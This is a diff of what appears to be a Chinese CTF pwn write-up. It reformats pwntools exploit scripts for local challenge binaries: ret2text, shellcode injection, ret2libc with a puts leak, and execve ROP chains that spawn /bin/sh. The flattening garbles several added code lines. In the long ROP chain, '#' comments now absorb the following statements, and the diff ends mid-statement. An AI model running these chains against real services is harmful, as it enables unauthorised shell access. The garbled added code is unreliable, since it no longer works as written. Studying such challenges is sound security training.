@@ -8,132 +8,11 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
+from pwn import * context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split
+() context(os = 'linux', arch = 'amd64',
+log_level = 'debug') p = process("./wbtdl") elf = ELF('./wbtdl') pop_rdi = 0x401196 binsh = 0x402008 ret = 0x40101a shell = elf.plt['system'] payload = b
+'a'* 0x78 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(shell) p.sendline(payload) p.interactive
 ()
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-p
-
-=
-
-process
-(
-"./wbtdl"
-)
-
-elf
-
-=
-
-ELF
-(
-'./wbtdl'
-)
-
-pop_rdi
-
-=
-
-0x401196
-
-binsh
-
-=
-
-0x402008
-
-ret
-
-=
-
-0x40101a
-
-shell
-
-=
-
-elf
-.
-plt
-[
-'system'
-]
-
-payload
-
-=
-
-b
-'a'
-*
-0x78
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh
-)
-+
-p64
-(
-ret
-)
-+
-p64
-(
-shell
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
 ```
 
 这里依次解释一下payload构造的每一项的作用
@@ -161,153 +40,28 @@ ret指令在这里起到一个“跳板”的作用，确保程序可以按照�
 
 
 ```
-
-[
-
-...
-
-]
-
-<-
-
-堆栈顶
-
-[
-
-返回地址
-
-]
-
-<-
-
-被溢出覆盖
-
+[...] <- 堆栈顶[返回地址] <- 被溢出覆盖
 ```
 
 1. 填充120字节的`a`后，覆盖栈上的返回地址
 
 
 ```
-
-[
-
-...
-
-]
-
-<-
-
-堆栈顶
-
-[
-
-0x401196
-
-]
-
-<-
-
-pop_rdi
-
-gadget地址
-
-[
-
-0x402008
-
-]
-
-<-
-
-/
-bin
-/
-sh字符串地址
-
-[
-
-0x40101a
-
-]
-
-<-
-
-ret指令地址
-
-[
-
-0x401050
-
-]
-
-<-
-
-system函数地址
-
+[...] <- 堆栈顶[0x401196] <- pop_rdi gadget地址[0x402008] <- / bin / sh字符串地址[0x40101a] <- ret指令地址[0x401050] <- system函数地址
 ```
 
 1. 执行pop\_rdi gadget后，栈顶弹出binsh地址，并放入rdi寄存器
 
 
 ```
-
-[
-
-...
-
-]
-
-<-
-
-堆栈顶
-
-[
-
-0x40101a
-
-]
-
-<-
-
-ret指令地址
-
-[
-
-0x401050
-
-]
-
-<-
-
-system函数地址
-
+[...] <- 堆栈顶[0x40101a] <- ret指令地址[0x401050] <- system函数地址
 ```
 
 1. ret指令被弹出，跳转到该地址执行
 
 
 ```
-
-[
-
-...
-
-]
-
-<-
-
-堆栈顶
-
-[
-
-0x401050
-
-]
-
-<-
-
-system函数地址
-
+[...] <- 堆栈顶[0x401050] <- system函数地址
 ```
 
 1. 执行system函数，ret指令从栈中弹出0x401050地址。于是system函数被调用，因为bin/sh的地址存放于rdi中，所以system调用rdi中的地址就是调用了bin/sh，从而执行了bin/sh
@@ -323,67 +77,9 @@ system函数地址
 
 
 ```
-
-linux
->
-
-ROPgadget
-
---
-binary
-
-wbtdl
-
---
-only
-
-"pop|ret"
-
-Gadgets
-
-information
-
-============================================================
-
-0x000000000040117d
-
-:
-
-pop
-
-rbp
-
-;
-
-ret
-
-0x0000000000401196
-
-:
-
-pop
-
-rdi
-
-;
-
-ret
-
-0x000000000040101a
-
-:
-
-ret
-
-Unique
-
-gadgets
-
-found
-:
-
-3
-
+linux > ROPgadget --
+binary wbtdl --
+only "pop|ret"Gadgets information ============================================================ 0x000000000040117d: pop rbp; ret 0x0000000000401196: pop rdi; ret 0x000000000040101a: ret Unique gadgets found: 3
 ```
 
 
@@ -473,40 +169,9 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./shellcode_level0'
-)
-
-p
-.
-send
-(
-asm
-(
-shellcraft
-.
-sh
-()))
-
-p
-.
-interactive
+from pwn import * p = process('./shellcode_level0') p.send(asm(shellcraft.sh
+())) p.interactive
 ()
-
 ```
 
 
@@ -548,65 +213,8 @@ flags为34（MAP\_PRIVATE | MAP\_ANONYMOUS）：创建一个私有的匿名映�
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./shellcode_level0'
-)
-
-shellcode
-
-=
-
-asm
-(
-'''
-
-    mov rax,0x68732f6e69622f
-
-    push rax
-
-    push rsp
-
-    pop rdi
-
-    push 0x3b
-
-    pop rax
-
-    xor esi, esi
-
-    xor edx, edx
-
-    syscall
-
-'''
-)
-
-p
-.
-send
-(
-shellcode
-)
-
-p
-.
-interactive
+from pwn import * p = process('./shellcode_level0') shellcode = asm('''mov rax,0x68732f6e69622f push rax push rsp pop rdi push 0x3b pop rax xor esi, esi xor edx, edx syscall ''') p.send(shellcode) p.interactive
 ()
-
 ```
 
 
@@ -627,287 +235,31 @@ by Maple
 `ret2libc`,新手上路的第一块绊脚石，这道题是很标准的两步走，先泄露libc再getshell
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-(
-os
-
-=
-
-'linux'
-,
-arch
-
-=
-
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-libc
-
-=
-
-ELF
-(
-'libc.so.6'
-)
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-elf
-
-=
-
-ELF
-(
-'./pwn'
-)
-
-main_addr
-
-=
-
-elf
-.
-symbols
-[
-'main'
-]
-
-puts_plt
-
-=
-
-elf
-.
-plt
-[
-'puts'
-]
-
-puts_got
-
-=
-
-elf
-.
-got
-[
-'puts'
-]
-
-pop_rdi
-
-=
-
-0x401176
-
-ret
-
-=
-
-0x40101a
-
-p
-.
-recv
-()
-
-payload
-
-=
-
-b
-'a'
-*
-(
-0xa
-+
-8
-)
-
-payload
+```python
+from pwn import * context(os = 'linux',
+arch = 'amd64',
+log_level = 'debug') libc = ELF('libc.so.6') p = process('./pwn') elf = ELF('./pwn') main_addr = elf.symbols['main'] puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] pop_rdi = 0x401176 ret = 0x40101a p.recv
+() payload = b
+'a'*(0xa + 8) payload
 +=
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-puts_got
-)
-+
-p64
-(
-puts_plt
-)
-+
-p64
-(
-main_addr
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-puts_addr
-
-=
-
-u64
-(
-p
-.
-recvuntil
-(
-'
+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) p.sendline(payload) puts_addr = u64(p.recvuntil('
 \x7f
 '
-)[
--
-6
-:]
-.
-ljust
-(
-8
-,
+)[- 6
+:].ljust(8,
 b
 '
 \x00
 '
-))
-
-print
-(
-hex
-(
-puts_addr
-))
-
-libc_base
-
-=
-
-puts_addr
--
-libc
-.
-sym
-[
-'puts'
-]
-
-print
-(
-hex
-(
-libc_base
-))
-
-system
-
-=
-
-libc_base
-+
-libc
-.
-sym
-[
-'system'
-]
-
-binsh
-
-=
-
-libc_base
-+
-next
-(
-libc
-.
-search
-(
-b
+)) print(hex(puts_addr
+)) libc_base = puts_addr - libc.sym['puts'] print(hex(libc_base
+)) system = libc_base + libc.sym['system'] binsh = libc_base + next(libc.search(b
 '/bin/sh'
-))
-
-payload2
-
-=
-
-b
-'a'
-*
-(
-0xa
-+
-8
-)
-
-payload2
+)) payload2 = b
+'a'*(0xa + 8) payload2
 +=
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh
-)
-+
-p64
-(
-ret
-)
-+
-p64
-(
-system
-)
-
-p
-.
-sendline
-(
-payload2
-)
-
-p
-.
-interactive
+p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) p.sendline(payload2) p.interactive
 ()
-
 ```
 
 
@@ -922,52 +274,7 @@ interactive
 
 
 ```
-
-main_addr
-
-=
-
-elf
-.
-symbols
-[
-'main'
-]
-
-puts_plt
-
-=
-
-elf
-.
-plt
-[
-'puts'
-]
-
-puts_got
-
-=
-
-elf
-.
-got
-[
-'puts'
-]
-
-pop_rdi
-
-=
-
-0x401176
-
-ret
-
-=
-
-0x40101a
-
+main_addr = elf.symbols['main'] puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] pop_rdi = 0x401176 ret = 0x40101a
 ```
 
 这里获取了puts函数在PLT(程序链接表)和GOT(全局偏移表)的地址，后面泄露用
@@ -977,49 +284,10 @@ ret
 
 
 ```
-
-payload
-
-=
-
-b
-'a'
-*
-(
-0xa
-+
-8
-)
-
-payload
+payload = b
+'a'*(0xa + 8) payload
 +=
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-puts_got
-)
-+
-p64
-(
-puts_plt
-)
-+
-p64
-(
-main_addr
-)
-
-p
-.
-sendline
-(
-payload
-)
-
+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) p.sendline(payload)
 ```
 
 首先溢出覆盖溢出点之前的内存区域，直到返回地址的位置。
@@ -1035,62 +303,18 @@ payload
 
 
 ```
-
-puts_addr
-
-=
-
-u64
-(
-p
-.
-recvuntil
-(
-'
+puts_addr = u64(p.recvuntil('
 \x7f
 '
-)[
--
-6
-:]
-.
-ljust
-(
-8
-,
+)[- 6
+:].ljust(8,
 b
 '
 \x00
 '
+)) print(hex(puts_addr
+)) libc_base = puts_addr - libc.sym['puts'] print(hex(libc_base
 ))
-
-print
-(
-hex
-(
-puts_addr
-))
-
-libc_base
-
-=
-
-puts_addr
--
-libc
-.
-sym
-[
-'puts'
-]
-
-print
-(
-hex
-(
-libc_base
-))
-
 ```
 
 - `u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))`
@@ -1108,83 +332,13 @@ libc_base
 
 
 ```
-
-system
-
-=
-
-libc_base
-+
-libc
-.
-sym
-[
-'system'
-]
-
-binsh
-
-=
-
-libc_base
-+
-next
-(
-libc
-.
-search
-(
-b
+system = libc_base + libc.sym['system'] binsh = libc_base + next(libc.search(b
 '/bin/sh'
-))
-
-payload2
-
-=
-
-b
-'a'
-*
-(
-0xa
-+
-8
-)
-
-payload2
+)) payload2 = b
+'a'*(0xa + 8) payload2
 +=
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh
-)
-+
-p64
-(
-ret
-)
-+
-p64
-(
-system
-)
-
-p
-.
-sendline
-(
-payload2
-)
-
-p
-.
-interactive
+p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) p.sendline(payload2) p.interactive
 ()
-
 ```
 
 - `binsh = libc_base+next(libc.search(b'/bin/sh'))`
@@ -1208,50 +362,16 @@ PLT(Procedure linkage table)过程连接表，位于代码段，是一个每个�
 可以一起做一个实验,编写如下源码
 
 
-```
-
-#include
-
-<stdio.h>
-
-void
-
-print_banner
-()
-
-{
-
-
-printf
-(
-"Welcome to World of PLT and GOT
+```c
+#include <stdio.h> void print_banner
+(){
+printf("Welcome to World of PLT and GOT
 \n
 "
-);
-
-}
-
-int
-
-main
-(
-void
-)
-
-{
-
-
+);} int main(void){
 print_banner
 ();
-
-
-return
-
-0
-;
-
-}
-
+return 0;}
 ```
 
 依次执行编译命令：
@@ -1275,20 +395,12 @@ printf()和函数实在glic动态库里面的，只有当程序运行起来的�
 
 ```Plain Text
 .text
-...
-
-// 调用printf的call指令
+...// 调用printf的call指令
 call printf\_stub
-...
-printf\_stub:
+...printf\_stub:
 mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址
-jmp rax // 跳过去执行printf函数
-
-.data
-...
-printf函数的储存地址,这里储存printf函数重定位后的地址
-
-
+jmp rax // 跳过去执行printf函数 .data
+...printf函数的储存地址,这里储存printf函数重定位后的地址
 ```
 
 总之，动态链接每个函数需要两个东西：
@@ -1339,71 +451,20 @@ lookup_printf:
 
 
 ```
-
-push
-
-$0x0
-
-//将数据压到栈上，作为要执行的函数的参数
-
-jmp
-
-1030
-
-<
-_init
-+
-0x30
->
-
-//去到了第一个表项里
-
+push $0x0 //将数据压到栈上，作为要执行的函数的参数 jmp 1030 < _init + 0x30 > //去到了第一个表项里
 ```
 
 继续
 
 
 ```
-
-00001030
-
-<
-__libc_start_main
+00001030 < __libc_start_main
 @
 plt
 -0x10
 >:
-
-push
-
-0x4
-(
-%
-ebx
-)
-
-//将数据压到栈上，作为后面函数的参数
-
-jmp
-
-*
-0x8
-(
-%
-ebx
-)
-
-//跳转到函数
-
-add
-
-%
-al
-,(
-%
-eax
-)
-
+push 0x4(% ebx) //将数据压到栈上，作为后面函数的参数 jmp * 0x8(% ebx) //跳转到函数 add % al
+,(% eax)
 ```
 
 再查找下看看jmp去哪了
@@ -1458,62 +519,11 @@ read只允许读入两个字节长度，而下面出现了一串很长的看不�
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-.
-arch
-
-=
-
-'amd64'
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-p
-.
-send
-(
-asm
-(
-'syscall'
-))
-
-p
-.
-send
-(
-b
-'a'
-*
-0x2
-+
-asm
-(
-shellcraft
-.
-sh
-()))
-
-p
-.
-interactive
+from pwn import * context.arch = 'amd64'p = process('./pwn') p.send(asm('syscall'
+)) p.send(b
+'a'* 0x2 + asm(shellcraft.sh
+())) p.interactive
 ()
-
 ```
 
 
@@ -1549,1214 +559,88 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-struct
-
-import
-
-pack
-
-io
-=
-process
-(
-'./gift'
-)
-
-p
-
-=
-
-b
-''
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000409f9e
-)
-
-
-# pop rsi ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x00000000004c50e0
-)
-
-
-# @ .data
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000419484
-)
-
-
-# pop rax ; ret
-
-p
-
-+=
-
-b
-'/bin//sh'
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x000000000044a5e5
-)
-
-
-# mov qword ptr [rsi], rax ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000409f9e
-)
-
-
-# pop rsi ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x00000000004c50e8
-)
-
-
-# @ .data + 8
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x000000000043d350
-)
-
-
-# xor rax, rax ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x000000000044a5e5
-)
-
-
-# mov qword ptr [rsi], rax ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000401f2f
-)
-
-
-# pop rdi ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x00000000004c50e0
-)
-
-
-# @ .data
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000409f9e
-)
-
-
-# pop rsi ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x00000000004c50e8
-)
-
-
-# @ .data + 8
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x000000000047f2eb
-)
-
-
-# pop rdx ; pop rbx ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x00000000004c50e8
-)
-
-
-# @ .data + 8
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x4141414141414141
-)
-
-
-# padding
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x000000000043d350
-)
-
-
-# xor rax, rax ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000471350
-)
-
-
-# add rax, 1 ; ret
-
-p
-
-+=
-
-pack
-(
-'<Q'
-,
-
-0x0000000000401ce4
-)
-
-
-# syscall
-
-payload
-=
-b
-'a'
-*
-(
-0x20
-+
-8
-)
-+
-p
-
-io
-.
-recv
+from pwn import * from struct import pack io = process('./gift') p = b
+''p += pack('<Q', 0x0000000000409f9e)
+# pop rsi ; ret p += pack('<Q', 0x00000000004c50e0)
+# @ .data p += pack('<Q', 0x0000000000419484)
+# pop rax ; ret p += b
+'/bin//sh'p += pack('<Q', 0x000000000044a5e5)
+# mov qword ptr [rsi], rax ; ret p += pack('<Q', 0x0000000000409f9e)
+# pop rsi ; ret p += pack('<Q', 0x00000000004c50e8)
+# @ .data + 8 p += pack('<Q', 0x000000000043d350)
+# xor rax, rax ; ret p += pack('<Q', 0x000000000044a5e5)
+# mov qword ptr [rsi], rax ; ret p += pack('<Q', 0x0000000000401f2f)
+# pop rdi ; ret p += pack('<Q', 0x00000000004c50e0)
+# @ .data p += pack('<Q', 0x0000000000409f9e)
+# pop rsi ; ret p += pack('<Q', 0x00000000004c50e8)
+# @ .data + 8 p += pack('<Q', 0x000000000047f2eb)
+# pop rdx ; pop rbx ; ret p += pack('<Q', 0x00000000004c50e8)
+# @ .data + 8 p += pack('<Q', 0x4141414141414141)
+# padding p += pack('<Q', 0x000000000043d350)
+# xor rax, rax ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000471350)
+# add rax, 1 ; ret p += pack('<Q', 0x0000000000401ce4)
+# syscall payload = b
+'a'*(0x20 + 8) + p io.recv
+() io.sendline(payload) io.interactive
 ()
-
-io
-.
-sendline
-(
-payload
-)
-
-io
-.
-interactive
-()
-
 ```
 
 
@@ -2776,125 +660,8 @@ ida里并没有发现`/bin.sh`，所以我们应该先构造read函数写入/bin
 
 
 ```
-
-payload
-
-=
-
-b
-'a'
-*
-0x40
-
-payload
-
-+=
-
-p64
-(
-rax
-)
-+
-p64
-(
-0x0
-)
-+
-p64
-(
-rdi
-)
-+
-p64
-(
-0
-)
-+
-p64
-(
-rsi
-)
-+
-p64
-(
-bss
-)
-+
-p64
-(
-rdx_rbx
-)
-+
-p64
-(
-0x10
-)
-+
-p64
-(
-0x0
-)
-+
-p64
-(
-syscall
-)
-
-payload
-
-+=
-
-p64
-(
-rax
-)
-+
-p64
-(
-0x3b
-)
-+
-p64
-(
-rdi
-)
-+
-p64
-(
-0x498ac9
-)
-+
-p64
-(
-rsi
-)
-+
-p64
-(
-0
-)
-+
-p64
-(
-rdx_rbx
-)
-+
-p64
-(
-0
-)
-+
-p64
-(
-0
-)
-+
-p64
-(
-syscall
-)
-
-
+payload = b
